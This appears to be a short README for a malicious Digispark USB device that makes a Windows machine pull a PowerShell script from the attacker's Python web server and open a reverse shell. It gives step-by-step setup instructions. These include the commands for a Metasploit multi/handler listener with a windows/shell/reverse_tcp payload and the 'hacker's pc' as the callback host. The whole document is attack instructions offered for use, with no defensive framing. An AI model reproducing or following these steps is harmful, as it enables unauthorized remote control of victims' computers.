## How to use:

First change the ip address in the script.ps1 file to your pc's ip do the same with the digispark ino file

Next you have to setup a simple python webserver with this command:
`python -m SimpleHTTPServer 8000` once you have done that make sure that the `script.ps1` file is in the sasme dir that you ran the command>

Then setup a msf listener on the hacker's pc aka your's with these commands:
`sudo msfconsole`
`use exploit/multi/handler`
`set payload windows/shell/reverse_tcp`
`set LHOST your ip`
`run`

When all of that is ready you can flash the new digi script.

Done! 